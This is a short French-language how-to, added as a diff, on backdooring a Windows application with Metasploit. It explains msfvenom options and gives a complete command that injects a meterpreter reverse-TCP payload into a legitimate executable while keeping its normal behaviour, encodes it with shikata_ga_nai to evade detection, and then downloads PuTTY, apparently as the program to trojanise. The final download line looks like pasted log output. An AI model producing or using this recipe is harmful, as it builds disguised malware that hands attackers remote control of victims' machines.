@@ -1,0 +1,26 @@
+backdoor sur une application windows
+
+
+Creation du backdoor sur metasploit
+
+Decomposition : 
+
+msfvenom : Générateur
+-a : architecture (x86/x64)
+--platform : plateforme du payload
+-x : modèle (template) du fichier executable
+-k : préserve le comportement du template et injecte la charge utile comme un nouveau thread
+-p : type de payload utiliser
+lport : au choix du temps que le numero est retenu
+-e : l'encodeur utiliser
+-i : le nombre d'iteration a utiliser pour l'encodage
+-b : les characters a evité
+-f : format de sorti pour le fichier 
+-o : sauvegarde du payload ( -o /root/Desktop/nomblabla.exe )
+
+msfvenom -a x86 --platform windows -x nomapplication.exe -k -p windows/meterpreter/reverse_tcp lhost= son ip  
+lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o nom.exe
+
+telechargement de putty
+
+wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe--2015-11-04 18:10:23-- http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
